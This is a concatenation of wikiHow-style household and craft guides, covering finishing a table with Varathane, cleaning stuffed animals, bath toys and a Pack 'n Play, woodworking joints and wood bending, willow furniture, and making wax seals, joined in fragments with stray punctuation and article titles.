For the smoothest finish, start sanding with 100-grit sandpaper, then repeat this with 150-grit, and finish sanding with 220-grit paper.Depending on the condition of your table, you may only need to lightly sand with a high grit rating sandpaper.
Some tables may already have a finish. This may negatively interact with the Varathane. In these cases, sand away all finish before applying Varathane.

, If there is a good amount of sawdust, break out a vacuum with a brush attachment. Any remaining traces of sawdust can be wiped away with a lint-free cloth dampened with mineral spirits. Lastly, wipe the table with a fresh, dry, lint-free cloth., Oil-based Varathane will be more heat resistant and durable. However, oil-bases usually have an amber tint that may hide the natural beauty of your wood. Water-based Varathane is better for showcasing wood’s natural beauty, but is less resilient., Shaking Varathane may cause air bubbles to form. Air bubbles can create a bumpy finish. Use a paint stirrer to mix the Varathane instead. If the Varathane seems especially thick, add a splash of mineral spirits to it as you mix.If you tend to be sensitive to strong fumes, wear a respirator when working with Varathane. Fumes may persist for some time after the final coat dries., Dip your brush into the Varathane. Wipe the excess off on the inside lip of the can, then use long, overlapping strokes to apply a thin layer to the table. Be extra careful around crevices and cracks. There should be no drips, unevenness, or pooling.Clean your brush while you wait for this coat of Varathane to dry so you can use it for the next coat too.

, Oil-based Varathane will take 24 hours to dry; water-based ones only take 4 to 6 hours. After this time has passed, test its dryness by gently sanding an out of sight portion with 220-grit sandpaper.

If you find that the Varathane isn’t yet dry, wait about an hour or two before testing it again with 220-grit paper., Now that the coat is dry, you can lightly sand its entire surface. If this is your first time working with Varathane, there may be some uneven spots. Aim for a smooth, uniform finish.

If you notice significant bumps in the dried coat, use a razor blade to shave these off. Be careful not to scratch the wood while doing this.
By lightly sanding each coat of Varathane, you’ll also remove any particles that got stuck in it while drying., Wipe down the surface with a dry, lint-free cloth. Retrieve your cleaned brush and layer another thin coat of Varathane onto the table. Allow it to dry and lightly sand it with a 400-grit sandpaper.Most oil-based Varathane will only need two coats, though some tables may require three (but no more than three). Water-bases may need up to a dozen coats., There may be some fine scratches or clouding in the Varathane from the 400-grit sandpaper. Buff these away with a light application of automotive polish using a clean cotton cloth. Use a circular motion when buffing.

Follow the label directions on your polish for best results. Generally, you should dampen your cotton cloth before using it to apply the polish."

Toys with any types of stiffeners should be surface washed only. Mohair, wool, rayon plush, and alpaca fur are not to be washed in a machine at all. And if the toy is too old and fragile, too big, or too firmly stuffed, you’ll have to hand wash it.Sequins or other glued-on, glittery items will probably not survive a wash, either.
If it’s filled with small foam balls, as is the case with Beanie Babies, rather than batting or stuffing, it’s not suitable for machine washing.
Double check for any technology. Look for any music or voice boxes, or any other electronics that aren’t meant for exposure to water.;
, Make sure you don’t lose Teddy's arm in the wash! Look for any tears or loose parts that need to be stitched. Remove clothing or any other parts that can be separated from the toy. Use scissors to cut any threads or strings that might come undone or cause further damage in the wash., Put the toy inside a mesh laundry bag for an extra layer of protection. This will help prevent the toy from snagging or getting torn up in the wash. If you don’t have one handy, a pillowcase secured with safety pins will work. In case something does fall off, the pillowcase or mesh bag will catch it before it gets lost in the machine’s drain., Vinegar is a great natural fabric softener, and works great for common kid-related messes that might involve vomit or urine.Mix one part clear vinegar with two parts warm water and dash of lemon juice or dish detergent.You can pour the diluted vinegar solution right into the laundry bag and let it soak before putting in the machine wash.
If anything is caked onto the stuffed toy, use a sponge liberally soaked in the solution to get any messy matter off before tossing it in the mesh bag.

, If you have a top-loader that doesn’t have a separate compartment for detergent, get the water running and put down detergent before you place the toy inside. It’s best to use a machine without an agitator. Never use a high-powered laundromat machine.Use a very small amount of mild detergent, such as Woolite, or just use the vinegar solution you made. If you go with detergent, a teaspoon or so will do, depending on the size of the stuffed animal.Soap nuts also have hypoallergenic properties, which are good if your child has a dust mite allergy.
Fabric softener is normally unnecessary and can harm the plush.

, The gentlest cycle possible will reduce the risk of parts torn off. Don’t use hot water, or you’ll discolor the stuffed animal. Hot water is especially harmful for any glued parts the toy might have., When you remove the toy from the mesh bag, you might find that the washing machine has left the stuffed toy lumpy or bumpy. Before letting it dry, check for any balled up batting. Gently work it out with your fingers and fluff while it’s still damp for best results., Most stuffed toys should be air dried. A dryer’s heat, even on low, can melt or damage any glue, plastic, or even the fabric of the stuffed toy. Lay it out on a dry towel, or use a clamp hanger or S-hooks to hang it. If you have any concern about allergies, hang the stuffed animal inside so it won’t pick up any pollen or other allergens. Note well, however, that direct sunlight is an efficient dryer, and the sun's ultraviolet light also has disinfectant properties., Use a dental pick to pick out knots in the fur, or a fine comb to give it a little more fluff. If the toy isn’t too fragile, you could tumble it in the dryer with a few towels for ten minutes for added fluff and softness, but make sure it’s set to no heat. Double check to make sure everything is stitched, no threads need to be cut, and that the toy is in good shape, and return it clean and fresh to your youngster."

Your toy may be too fragile for delicate so hand washing may be the best way to give it a thorough clean without damaging it.Don’t just spot clean in case the stain has penetrated beneath the surface. If a stain gets into the stuffing, germs and odors can linger. For example, if a child is potty training and urinates on the toy, the insides may be soaked despite rinsing any visual signs of the stain away.

, Use a plug so your sink fills with water or use a large container, like a bucket or basin, and fill it with cold water and delicate soap. Make sure you read whether the soap is best suited for the material of your stuffed animal. Strong soaps may discolour or damage your animal.Don’t use too much soap or it may be difficult to rinse off.

, Fully immerse your animal so that the soap water mixture gets into the innards and fights the stain thoroughly. Gently clean the animal as it is immersed. Use your hands to gently rub the material and get out any debris or stains., Thoroughly rinse out all the soap. Get as much water out as possible. Don’t shake or twist the animal. Press it between old towels as you squeeze the water out.You may gently ring out your animal depending on its condition. Older animals may easily fall apart if mishandled.

, Re-fluff and reshape your animal. Allow it to sit and dry. Don’t place it directly near heat or sunlight or it might become discolored or misshaped., If there’s only a little dirt on the surface or your tag says “surface clean only”, use a gentle cleanser. You may use upholstery shampoo that creates foam to remove the stain. Read the ingredients to make sure there aren’t any harsh chemicals that could be harmful to a child.Your child may place the toy in her mouth so be sure that any cleaning agent is safe. There are numerous cleaners that are marketed specifically for cleaning stuffed animals. Find a cleaner that’s safe and works for you. You may also use unscented baby detergent with a damp cloth to spot clean.

, If your animal is averaged size, place it in a large garbage bag with ½ cup baking soda. You may add more baking soda if it is quite large. Close the bag firmly and give it a good shake. Keep the bag closed and let the animal sit for 15 - 20 minutes. Open the bag and brush off the excess baking soda.You may use a vacuum if you feel your animal will not get damaged. Do not shake the bag too vigorously if you feel your animal will come apart.

Use a clothesline.,
Air dry your animal.,
Use a dryer.,
Avoid tumble drying.,
Ensure both the inside and outside are dry.,
Reposition and reshape the animal.",How to Clean a Stuffed Animal3," The wetter your toy, the longer it will take to dry. Make sure all the excess water is gone before drying your animal on a clothesline. On a sunny day, use clothespins to hang your toy and set it to dry.


The sun is a natural stain remover and sanitizer. Spot cleaning doesn’t require a lot of water so you probably won’t need to hang out an animal that has been spot cleaned.

, Let your stuffed animal air dry if the weather isn’t cooperating. Simply let it sit in a protected area, away from pets and children., If your label indicates that you are able to use a dryer, place your animal in a dryer on low heat or permanent press. You may also use a hair dryer on a low setting or on cool.While heat dries the animal quickly, it can also damage the animal or mat the fur. If your dryer has a fluff air setting, use this to help maintain the fur.

, Add towels into your load to soften the movements of your animal. Also use dryer sheets to eliminate static electricity buildup so your little one doesn’t get shocked when first holding it.

, The inside takes longer than the outside to dry. Make sure the inside is dry or else mildew may grow, which can be hazardous to a child’s health. Use a dryer or hair dryer for a short period to hasten the process., The stuffing may have jostled during the drying process so reshape your animal and fluff the fur so that it looks like the original version.

Consider the benefits of vinegar.,
Mix the vinegar solution.,
Remove any excess water inside the toy.,
Soak the toys in the vinegar solution.,
Scrub the toy with the vinegar using a small brush.,
Rinse the toys in water and let them dry.",How to Clean Children's Bath Toys1," Vinegar is a very effective cleaner and is a harmless natural cleaner. It should be your first choice for cleaning and preventing any “unwanted additives” and other dirt or bacteria on your child's toys., Combine two parts warm water and one part white vinegar. The acid in the vinegar will naturally dissolve most of the dirt, so you do not need to use soap.


Apple cider vinegar is also very effective at cleaning bath toys. However, white alcoholic vinegar is the best choice because it is colorless and is less likely to leave any unwanted residue., Bath toys usually have a hole on the bottom of the toy that makes a sound when they are squeezed, but this hole can also allow water to get into the inside of the toys. If water sits inside the toy, it can develop bacteria and promote the growth of mold. So always squeeze out any excess water and let the toys dry thoroughly.

, Let the toys soak for at least 10-15 minutes. Make sure the solution also gets into the inside of the toy, where dirt can accumulate.

, Scrub in all directions and on the entire surface of the toy using a small brush or toothbrush.


If there are narrow areas or small openings on the toy, scrub these surfaces using the tip of the brush. For example, to clean the inside of a rubber duck’s beak, put the brush inside the beak and scrub the surface in a circular motion.

, Use clean water to rinse the toys and allow them to dry completely in the sun or on a dry towel before allowing your child to use them."

Start with clean hands whenever cleaning a toy.

,
Check what the eyes are made of.,
Decide whether to spot clean or wash the toy completely.,
Hair dry on low if you have had to wash the stuffed animal as well.",How to Clean a Stuffed Animal's Eyes1,",


Plastic eyes can be damaged by abrasive items removing ink or gouging into the plastic, and heat can melt it.
Glass eyes can chip, crack or break if mishandled.

, If just the eyes are the issue, simply spot clean them with one of the suggested methods.


If washing the toy as a whole in the washing machine and it has plastic eyes, place the stuffed toy in a pillow case before putting in the washing machine. The pillow case will protect the eyes.
It is not recommended that any stuffed toy with glass eyes, moving eyes or eyelashes be washed in a machine. Doing so will likely harm these areas of the toy.

, Alternatively, wash on a lovely warm day and air dry outside, under a porch or shaded area (being careful to avoid birds that might leave a mark).

Let it dry.",How to Clean a Pack 'n Play1," Take the Pack 'n Play outside or in your garage. When scrubbing it down, you're likely to get soap and water everywhere, so you'll want to be somewhere you can drip a little bit. Take the mattress out to wash separately.If the mattress has a cover, take it off, and put it in the washing machine.;
, Add a 1/2 a cup (120 milliliters) or so of detergent to a bucket of warm water. Agitate the water to make sure the detergent is mixed in. Submerge a clean cloth or soft brush in the water., Use the solution to scrub down the whole Pack 'n Play, inside and out. You may need to add support on one side with your hand as you scrub the other, particularly on the mesh. Pay special attention to dirty areas. Scrub the mattress, as well., Use a jet stream setting on your hose to rinse down the Pack 'n Play inside and out. Hold the mattress up, and spray down both sides until the water runs clean. Shake the mattress a little bit to get excess water off of it., Leave the Pack 'n Play and the mattress outside to dry in the sun. Aim for a warm day. If it hasn't dried in a day, you may want to place it outside again the next day. The sun will also help sanitize the Pack 'n Play."

Remove the toys once the cycle has finished and dry them.",How to Clean Children's Bath Toys2," The dishwasher runs at high temperatures in order to destroy any bacteria, so always check the label on the toy(s) to make sure it is dishwasher safe before using this method.

, It’s important to dry the toys as much as possible before you put them in the dishwasher to help reduce the moisture on and in the toys., Put them in a lingerie bag or in a plastic basket if they are smaller, on the top shelf of the machine., You can use regular detergent, a natural solution, or dishwasher capsules.


For a natural cleaning agent, use a solution of one part white vinegar and three parts warm water., Use the warming cycle setting to ensure the toys come out dry.Some machines have an extra cycle with a higher temperature for sterilization. Be careful with this option as bath toys made of plastic or rubber can melt or be damaged by high temperatures.

, Put the toys on a dry towel to air dry completely before putting them back in the tub or allowing your child to use them."

Check your child’s toys for mold.,
Make the cleaning solution.,
Soak the toys in the solution.,
Thoroughly rinse the toys with clean water.,
Allow the toys to dry completely.",How to Clean Children's Bath Toys3," If there are visible traces of mold, chlorine bleach is one way you can remove the mold and sanitize the toys. Always pay strict attention to the amount of bleach in the cleaning solution you use as bleach can be harmful to the health of your children if it is ingested.Due to health risks, this method should only be used sparingly, and only if your child’s toys are very moldy.Use Environmental Protection Agency registered bleach products, as the concentration of chemicals in bleach has recently risen., Combine 1 tablespoon of chlorine bleach with 1 gallon (3.8 L) of water.Diluting the bleach lessens its harmful effects., You can spray the toys with the solution or place the toys in a tub of the solution. Press the toys while they are soaking so the solution is sucked through any holes and gets inside the toys.Allow the solution to remain on the toys for two minutes.For a more thorough clean, you can soak the bath toys in a solution of 1/2 cup bleach and 1 gallon (3.8 L) of water for fifteen minutes., Squeeze and rinse the toys several times. Be sure to also rinse the inside of the toys by pouring clean water into the holes and squeezing the toys.


While you cannot see bleach, you can smell it. So rinse the toys until you can no longer smell bleach on them.
If you do not rinse the toys well, your child can swallow any bleach left on or inside the toy. Bleach poses numerous health risks and issues, especially for young children, and is highly corrosive to the skin, eyes, and lungs. So always make sure you rinse away all bleach from the toys., You can air dry them on a dry towel or in the sun.


Always check that the toys are completely dried before allowing your child to play with them.

Squeeze and rinse the bath toys after every use.,
Thoroughly dry the toys after every use.,
Store the dry toys in a breathable box.,
Consider sealing up the holes on the bath toys.",How to Clean Children's Bath Toys4," Removing any excess water from the toys on a consistent basis will cut down on the amount of bacteria and dirt that remains on the toys.

, Place the toys on a dry towel or in the sun to ensure they get good ventilation and dry out completely as the moist environment creates an ideal breeding ground for mold and bacteria.

, Boxes for bath toys should be placed outside the bathroom, where there is natural light and good ventilation. A box made with perforated material or mesh is ideal as it allows for good air circulation., As the interior of the toys is the hardest area to clean and to dry, it may be a good idea to seal or close up these holes. You can do this using super glue or a glue gun.If you use a glue gun to seal the holes, be sure not to leave it in the vicinity of children to prevent the risk of burns.
If the toy is wet before you seal it and you do not dry it out, this can lead to the development of bacteria and mold inside the sealed toy. If the toy then breaks or the glue does not stick, your child may be exposed to the infected water. So before you seal the holes, be sure to disinfect and thoroughly dry the toys.Check the sealed holes on the toys periodically to make sure they are glued well, as any loose glue can become a choking hazard.

If yours doesn't fit all at once, you may need to do it in parts. Begin filling up the tub with warm to hot water.You can use the frame to hold the mattress down in the water.

, As the tub is filling up, pour in a mixture of detergent, vinegar, and baking soda. You'll need about 1/2 a cup (120 milliliters) of laundry detergent, 1/4 cup (60 milliliters) of baking soda, and 1/4 cup (60 milliliters) of vinegar. If you're using powdered detergent, you may want to mix it with water before adding it to the tub., Once the you've added the soap and filled up the tub so the Pack 'n Play is submerged, leave it to soak for at least an hour. If it's not completely submerged, flip it after half an hour, and leave it for another thirty minutes., You can rinse it in the tub if you have a removable shower head.

Attach the trim.",How to Make Stretcher Bars," Select the type of wood you desire. Stretcher bars are often made with pine. The sides should measure 1 by 2 inches (2.5 by 5.1 cm).
, Decide how long and wide you want your displayed canvas to be. These measurements will form the length and width of the stretcher bars. Your canvas will stretch over and around the backs of the stretcher bars when attaching to them, so the length and width of the entire canvas will be significantly greater than the length and width of the stretcher bars., Use a hand saw to cut the 4 stretcher bars to the required lengths.

Place a stretcher bar into the miter block.
Use a hand saw to trim the end of the bar to a 45-degree angle.

Start by making the jig as shown in the picture and drawing.,
The dovetail splines are inserted through an already assembled mitre joint, so the first step is to assemble the joint and glue it up.,





Clamp your assembled mitre joint in the bench vice so it faces upwards.
,





Mark out the dovetail spacings across the joint.,





See the clearly marked-up work piece is now ready for machining.,





Make a setting bar to help you set up your jig accurately.,





Insert the setting bar through the jig and line it up on the first of the marked lines on the joint below.
,





Clamp the jig in place so it fits squarely over the mitred workpiece.,





Stand the router on the jig and plunge the cutter until it touches the joint.,





Start the machine and run it through the joint.,





After machining, the joint has an evenly spaced series of cleanly-cut sockets.
,





Remove the dovetail cutter from the router.,





Transfer this angle setting to your table saw.,





Set the rip fence a little wider than the base of the dovetail, and rip down both sides of your timber to make the splines.,





Adjust the fit.,





Cut the splines into short lengths.,





Repeat the process for the other sockets.,





Trim off the waste with a flexible pull saw.,





Finally clean up the surface of the joint with fine abrasive paper.
,





The finished joint, with the dark splines contrasting well with the paler wood of the workpiece.
",How to Make Spline Dovetail Joints," Use 18mm MDF for strength, and make sure the included angle is exactly 90 degrees to ensure stability. The sizes given are advisory; though keep the top plate as large as possible for maximum router support.
, It’s a good idea to use biscuits to help hold the joint in alignment.,, Start about 10mm in from each edge for the outside pair, and then divide the space between equally across the joint., Fit the router with a guide bush and dovetail cutter., This should fit snugly in the guide bush groove and have its centre clearly marked.,, Check its alignment again with the setting bar., Set the depth 10mm below this. Pull the router back, plunge to full depth and lock it down., Switch off without releasing the plunge lock. Re-set the jig and repeat for all the marked positions across the joint.,, Set a sliding bevel to match its cutting angle., The crown guard has been removed for clarity here, but must always be fitted when using the saw., Prepare a long length; trim it to size later., Lay the timber on its side, and with the blade still tilted, take shaving cuts off the bottom until the piece will just fit into the dovetail sockets., Apply a little glue and gently drive one into place in the first socket with a hammer., Put the joint aside to allow the glue to set., This allows you to trim right up to the edge without damaging the workpiece.,,"

Create a bending form.,
Plane your lumber into thin strips.,
Soak the strips in hot water (optional).,
Glue the strips together immediately.,
Clamp the wood onto your bending form.,
Leave the wood until the glue sets.",How to Make Wood Flexible1," Set a drawing compass to the thickness of your lumber. Using the compass, trace two lines on a stack of plywood in the shape you'd like to bend your wood. Cut along both lines with a bandsaw. Now you have a gap the perfect size for your lumber, and a two-part plywood form to press the lumber from both sides.Alternatively, just cut one line to create the inner curve, and use clamps to press the lumber against it.
There will be a small amount of spring-back after you release the wood with this method. Bend it slightly farther than you want the final shape.;
, Once glued back together, these strips will be much more flexible than the original lumber. You can use any type of wood, but cross-grained wood and wood with knots are likely to break.Plane it into strips according to how far you plan to bend it:For a curve with a 2 to 4 inch radius (5–10 cm), plane the wood into 3/32"" (2.4 mm) strips.
For a curve with a 4 to 8 inch (10–20 cm) radius, plane to 1/8"" (3.2 mm).
For an 8 to 12 inch (20–30 cm) radius, plane to 3/16"" (4.8 mm).
For a radius greater than 12 inches (30 cm), plane to 1/4"" (6.4 mm).
These are guidelines to use as a starting point. The wood species and grain slope affect the result, so you may need to experiment.

, This will make the wood more flexible, which may be necessary for tight bends. However, for best results, you will need to keep the wood wet for the first three or four hours after you bend it. Skip this step if you prefer a less time-intensive approach, or if you are only creating slight bends., Working with freshly planed surfaces will increase the strength of the bond. You can use epoxy, polyurethane, aliphatic resin, or just about any high-strength glue that works on wood and meets the needs of your project.Distribute the glue as evenly as possible. Rolling a 3/8"" (9.5 mm) threaded rod over the wood can give better results than brushing on the glue.
Flip every other strip end-to-end before gluing. This will prevent the grain slope from lining up, removing lines of weakness.

, Bend the laminated wood along the piece of plywood you prepared. Clamp it tight in several places. The more clamps you use, the less chance there is that gaps will appear between strips, and the closer your wood will get to the desired shape.

, Check your glue label instructions for the curing time. (If it doesn't say, wait 24 hours.) After that, the wood should stay in its new shape.


If you soaked the wood, don't forget to keep it wet for the first three or four hours.

Find a 28-inch (71.1 cm) rod that is flexible but sturdy to use as the back of the chair's frame.,
Nail 3 members horizontally across the seat to make the seat frame.,
Coat with marine spar varnish to protect from rain and sun.",How to Make Willow Furniture," The time to cut and gather willow is when the leaf tips start to appear and the buds grow larger. Willow grows near water, so look along stream beds, lakes and ponds.

Ask for permission if you find good willow to trim on private property or state land. Some states classify willow as a weed and allow free harvesting.;
, You will need thicker pieces for your frame and smaller branches to fill in the frame. After a willow is pruned, it will sprout new branches.

The following amounts of willow are for a medium sized chair. For a bench, gather twice as much, and focus on finding longer, thicker branches. To create a table, triple the amount and look for very long branches or fallen trees. For a trellis, gather 4 long thick pieces and many bendable switches.
For your frame. Prune about 50 feet (15.24 m) of branches that are 1.5 inches (3.8 cm) in diameter. The heaviest material will go on the legs of your furniture for good support.
For your chair arms. Prune 15 switches (small thin branches) that are 4 to 5 feet (1.2 to 1.5 m) (1.2 to 1.5 m) long and 0.75 inches (1.9 cm) in diameter.
For your headrest, prune 10 switches that are 0.75 inches (1.9 cm) in diameter and 8 to 9 feet (2.4 to 2.7 m) (2.4 to 2.7 m) long. With switches this long, they will taper at the end.

, For a chair, the rear legs are twice the length of the front legs. The rungs, braces and crosspieces will be halfway between the 2 lengths.

For example: A medium chair's proportions would have 14 inch (35.6 cm) front legs, 28 inch (71.1 cm) back legs and 21 inch (53.3 cm) crosspieces.

, Cut all your pieces to the appropriate length with your saw., This is often called shirring wood. This will prevent your wood from splitting at the ends., Rungs are the horizontal pieces that connect the frame's sides. The lower of the rungs should be 3.5 inches (8.9 cm) from the top of the front leg., Place 1 front and 1 back leg down so that they are nearly parallel. Lay 2 rungs across your legs at right angles. Nail the rungs to the legs.

Choose nails that are long enough to just reach through the 2 willow branches you are joining. It is extremely hard to clinch a nail that is too long without damaging the wood.

, When both sides are finished, stand them side by side with the rungs on the outside, about 18 inches apart., You may need someone to assist you. Nail crosspieces going horizontally on the front and back of your chair. Nail the crossmember branches to the legs, and never to the rungs, even though you are choosing to connect them just above the rungs. Nail 3 parallel crosspieces at the front of the chair and 3 at the back., Then place another 28-inch (71.1 cm) piece across the top of the 2 rear leg branches. These will connect with the arm and headrest branches.

The frame should be a bit wobbly. Move it around until the 4 legs are flat on the ground. Keeping this structure, lay the chair on its side. Working on the inside of the chair's frame, nail thick branches as braces between the front and back leg on 1 side. Lay the chair on the other side, and nail a brace between the front and the back leg. Add nails until it does not wobble.

, With assistance, curve it to create the outer edge that connects to the left and right rear legs. Nail it in to place. Take 21-inch (53.3 cm) switches and nail them to the seat frame and the chair back's frame, working from the outside in and alternating nailing on the right and left. This back and forth action will create a sturdier back that adheres to your frame., Then take your longest switches and stretch them from the front of the seat, and curving up to the top of your oval headrest you have just created.

Use your imagination with these last willow switches. You can curve them, or shape them into curlicues.

, Repeat once each year in the spring."

Choose your lumber.,
Build a steam box.,
Set up steam collection and drainage.,
Build a bending form.,
Steam the wood.,
Bend the wood onto the form.,
Leave the wood to cool and dry.",How to Make Wood Flexible2," Green and air-dried hardwood are both suitable for steaming. The risk of breaking is too high for kiln-dried wood, softwood, and any lumber with less than 10% moisture content (15% for tight bends).Straight-grained lumber with minimal knots is recommended, but you can use cross-grained lumber with a grain slope less than 1:15.Hackberry and oak are among the best hardwoods for this approach; a 1 inch (2.5 cm) thick piece can bend to a curve radius as tight as 2 inches (5 cm). Maple, cherry, and poplar are prone to damage and only accept slight bends., Construct a tongue-and-groove box large enough to hold your lumber out of ¾"" (19 mm) thick, exterior-grade fir plywood. Fit a hinged door on each end, and seal the joints with silicone and screws. Insert brass rods or wooden dowels through the sides for the lumber to rest on, so steam can circulate around it.Leave the box unpainted and unsealed so it can dry out between uses.


If you are only steaming parts the size of walking sticks or smaller, you can use a length of ABS pipe with a 2 to 4 inch (5–10 cm) diameter instead.
Another alternative is to melt 6 mil polyethylene into a plastic bag around your lumber. You can then bend the lumber while it is still in the steam bag for maximum flexibility., You can use an electric tea kettle as a steam source for steaming pieces 1"" x 2"" (19 x 38 mm) or smaller. For larger pieces, use a clean pressure cooker, metal gas can, or other large container over an electric hot plate; or rent a wallpaper steamer. Connect the steam source to your box as follows:Connect a 1½"" (3.8 cm) diameter hose to the steam source with tightly fitted nuts. Cut a hole in the steam source if necessary to accommodate this.
Cut a hole in the base of the box and attach the other end of the hose.
Drill a few small drainage holes into the base of the box, especially toward one end. Set up the box so it slopes toward this end.
Optionally, drill a hole in the top of the box and plug it with a stopper. This allows you to insert a thermometer.

, Use a bandsaw to cut a stack of plywood into the shape of the inner curve. Screw the plywood onto a table to create a form to bend your wood around once steamed. To prevent the outer curve from splintering, you can either form a similar plywood back (just cut out the thickness of your lumber from the remaining plywood), or secure a metal bending strap to your table.Unless you are only bending a slight curve, you will also need to place clamps against the ends of the lumber.Metal straps may discolor your wood. If this is an issue, use an oversize piece of lumber and remove the affected area.
If you will bend the wood to a curve radius less than 4"" (10 cm), you will need a stronger material to bend it around. Cut off the tip of the plywood corner and replace it with a piece of hardwood.

, Put the wood into the box, seal it, and heat plenty of water to create steam. As a general rule, wood needs steaming for one hour per inch (2.5 cm) of thickness at 212ºF (100ºC).Put in a few pieces of test lumber as well so you can experiment, since moisture content, wood species, and other factors all affect the wood's behavior. (For example, if your wood has a moisture content above 20%, you may only need to steam for half an hour per inch.)


If you have a thermometer, use a small hole at the top of the box to check the temperature. If it's too cool, wrap the box in an insulating material.
To avoid steam burns, wear work gloves and keep your face back when opening the steam box.

, The heat and moisture from the steam will soften the lignin, a substance responsible for wood's rigid shape. Immediately after steaming, place the wood against one end piece on your bending form. Starting at that end, bend the wood around your form at a moderate, steady pace. Compress the wood securely between the two pieces of plywood (or the plywood and backing strap). If the wood is not secure, the outer edge may stretch and weaken.If the wood cracks, it needs more steaming.
If the wood wrinkles along the inner edge, it may have steamed too long, or there may be too much compression.

, The length of time varies depending on the type of wood, thickness, and intended purpose. As a starting point, keep the wood in a well-ventilated location for 24 hours before removing it from the bending form.If it cooled sufficiently, the lumber should hold its new shape indefinitely.

Plan your project.,
Cut a series of grooves against the grain.,
Cut almost to the edge of the wood.,
Bend the wood inward.,
Fill the kerfs if desired.",How to Make Wood Flexible3," A kerf is just a saw cut, and kerfing means cutting a series of these slits so your wood can bend. The result is much weaker than other methods of bending wood, but it keeps the wood permanently flexible along that curve.It is also the fastest approach, and does not require special equipment.

, The cuts must be against the grain to reduce the chance of splitting the wood. Use a table saw to make these cuts along the part of the wood you'd like to bend. Space your cuts evenly (and close together) with a jig, or use a visual indicator on your table to get a consistent distance between cuts., In order to bend your wood more than a slight curve, you'll need to cut almost entirely through the wood. Leave only a thin edge to hold the wood together.

, Bend the wood so the ""spines"" left by your cut touch, forming a single stress-bearing edge. You can now keep the bend in place by fastening the two ends of the lumber to a stable object. Remember that this is a weak bend, and do not rely on it to support much weight or stress.

, If you want to hide the gaps left by the saw, plug them with wood filler that matches your lumber. Alternatively, leave the wood as-is if you prefer the aesthetic, or if you would like to bend it to different angles.

Find something to use as a handle for your stamp.,
Find an interesting button to use for the design part of your stamp.,
Hot glue the button to the handle.,
Let the glue set.,
Use the stamp.",How to Make a Seal1," A plain wine cork work great, but you an also use an old chess piece for something more antique-looking. You can also make your own handle by rolling some polymer clay into a tube the size of your thumb, and then baking it in your oven according to the instructions on the package.


If you decide to use a chess piece, be sure to peel the felt away from the bottom.Most polymer clays need to be baked at 275°F (135°C) for 20 to 30 minutes, depending on the thickness of the piece.;
, Coat buttons are great for this, because they don't have button holes at the front, which can affect your design. If you can't find an interesting button, you can also use a brooch, cameo pin, a charm, or a pendant.

, Make sure that you are using enough glue so that the button sits securely on the bottom of the handle. If you are using a chess piece or a polymer clay tube as your handle, then you can use 2-part epoxy clay for something more durable.To use 2-part epoxy clay: cut off equal amounts of part A and part B, then mix them together until you get a uniform color. Mold the clay to the base of the handle, then press the button into it. Smooth down any jagged or uneven edges with your finger.Once the clay cures, you can sand any roughness down further.
You can also use another type of thick glue, such as industrial-strength glue. Do not use white, school glue. It is not strong enough.

, If you used hot glue, this should only take a few minutes. If you used 2-part epoxy, this might take longer.

, Rub a little bit of oil onto the design part of the stamp, then press it into a puddle of hot wax or hot glue. Wait a few seconds, then slowly pull the stamp away. For more detailed instructions, refer to the methods on making wax seals and hot glue seals.

Buy disinfectant wipes.,
Use the wipes with the right type of toy.,
Read the directions.,
Wipe the toy thoroughly.,
Leave the toy out to dry.,
Wash your hands.",How to Disinfect Toys1," This is a good solution for quickly disinfecting a dirty toy. Purchase wipes that are specifically made for disinfecting. Other types of wipes may clean off the toy, but not disinfect it. A few well-known brands of disinfectant wipes are Clorox and Lysol.This method is not recommended for routine cleaning of toys, but it is effective when disinfecting needs to be done quickly. Disinfecting wipes eradicate good bacteria as well as bad bacteria. Exposure to good bacteria is necessary for a strong immune system.
A couple of natural disinfectant wipe brands are CleanWell and Seventh Generation.;
, Wipes work best on wooden toys, boards, and books. Wipes still work well on plastic toys and dolls. This method will not work well on stuffed animals., Disinfectant wipes won’t work if you do not use them properly. Different brands may have slightly different directions, but most of the directions are similar. Most wipes require about four to ten minutes of the disinfectant staying wet on the surface to work., Take a wipe from the packaging and begin to wipe the toy. Make sure the wipe covers every part of the toy. You should not miss a corner, indentation, or cranny. Once you have wiped the toy down completely, do not put it back right away. Go over the toy more than once with a wipe if you feel that you missed a spot.

, The toy only needs to be wet with disinfectant for less than ten minutes, but it is better to leave the toy out to dry for longer if possible. Put it in a place that is out of reach for children.Children can become ill if they put the wet toys in their mouths.

, It is not good to get the disinfectant on your skin, so wash your hands after using the wipes. Also, make sure to wipe down the surface and toy with water once the disinfectant has dried. At this point, the toy can be used to play with again."

Roll some polymer clay into a tube, about the size of your thumb.,
Tap the bottom of the tube against a flat surface.,
Carve a design into the bottom of the tube.,
Bake the clay piece(s) according to the instructions on the package.,
Let the stamp cool.,
Use the stamp.",How to Make a Seal2," If you'd like, you can make it taper towards the middle to make it easier to grab onto.

, This will give you a nice, smooth surface to work on., Many clay-working tools are too big to carve such intricate designs. Luckily, you can use just about anything to carve your design, such as a: ball-point pen, knitting needle, toothpick, stylus, or paperclip. You can also ""stamp"" a design into the clay. Simply find a fancy coat button or charm, and press it into the clay. Carefully pull the button or charm away. The indent is your design.

, Preheat your oven to the temperature specified on the package, usually about 275°F (135°C). Once the oven is hot, stick the piece into the oven and wait the time specified on the package, usually 20 to 30 minutes, depending on the thickness of the piece.

, If you'd like, you can sand the bottom of the stamp gently to make it perfectly smooth. Do this by placing a sheet of fine-grit sandpaper on a flat surface, and then rubbing the base of the stamp back and forth across it. This should not affect your design, because it is carved into the stamp. Rinse the stamp when you are done, then part it dry.

, Lightly oat your stamp with oil or water first, then press it into a puddle of melted wax or hot glue. Wait a few seconds, then pull the stamp away. For more detailed instructions, refer to the methods on making wax seals and hot glue seals.


You can also make a seal out of clay. Simply roll a bit of polymer clay into a ball, then flatten it. Rub some oil or water onto the stamp, then press it into the clay. Gently pull the stamp away, then bake the clay piece according to the package directions."
"
Work above a fire-proof surface and have some water near by.,
Melt your wax.,
Let the wax drip onto the paper where you want the seal to go.,
Stir the wax using your wax stick.,
Dampen your stamp with some water.,
Orient the stamp, then press it into the wax.,
Hold the stamp against the wax for about 10 to 15 seconds.,
Gently pull the stamp away from the wax.,
Let the wax finish hardening.",How to Make a Seal3," You will be working with fire, and with fire, come many risks. Even if you are extra careful, there is a chance of the wax igniting as it drips onto your paper. This can result in a small fire. Work on top of a tiled counter or a clean, metal baking sheet. Have a large glass of water near by—something that is easy to grab and spill.


This method is recommended for stamps made out of metal. You can use other stamps, such as clay ones, but they will be more likely to stick to the wax.

